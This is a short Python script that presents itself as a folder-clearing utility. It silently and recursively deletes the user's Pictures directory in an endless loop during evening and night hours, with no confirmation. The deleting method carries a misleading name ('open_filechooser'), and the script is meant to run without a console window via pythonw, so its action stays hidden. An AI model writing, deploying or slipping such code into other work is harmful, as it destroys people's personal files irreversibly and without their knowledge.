
__author__ = "Umar Sa'ad"
__email__ = "saaduumar42@gmail.com"

# """
# This deletes all files and directories in a folder as requested.

# Be careful when you use it.

# I'll not be responsible for any misuse of the program
# """

import shutil
import plyer
import time


class ClearImage:
    mytime = time.localtime()

    def open_filechooser(self):
        path = plyer.storagepath.get_pictures_dir()
        shutil.rmtree(path)
        print(path)


active = True
while active:
    mytime = time.localtime()
    if mytime.tm_hour < 6 or mytime.tm_hour > 18:
        ClearImage().open_filechooser()


# run the code by calling the following in your terminal
# pythonw clear_img.py
